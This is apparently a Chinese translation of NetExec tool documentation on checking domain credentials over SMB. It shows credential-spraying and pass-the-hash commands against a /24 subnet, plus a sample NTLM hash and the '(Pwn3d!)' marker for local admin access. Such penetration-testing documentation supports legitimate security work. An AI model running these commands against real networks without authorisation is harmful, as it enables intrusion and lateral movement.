# 检查域凭证

### 身份认证

* 登录失败显示 \[-]
* 登录成功显示 \[+] Domain\Username:Password

{% hint style="info" %}
代码执行成功会在登录确认后添加 (Pwn3d!)。在 SMB 协议中，这通常意味着你的已攻破用户在本地管理员组中。
{% endhint %}

```
    SMB         192.168.1.101    445    HOSTNAME          [+] DOMAIN\Username:Password (Pwn3d!)
```

以下检查将尝试对整个 /24 网段进行身份认证，当然也可以只针对单个目标。

{% hint style="warning" %}
如果 NTLM 认证不可用，Kerberos 需要使用主机名和域名而不是 IP 地址。
{% endhint %}

### 用户名/密码

```
#~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE'
```

### 用户名/哈希

在获取到如下格式的凭证后：\
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::\
你可以使用完整哈希或仅使用 NT 哈希（后半部分）

```
#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
#~ nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
#~ nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```
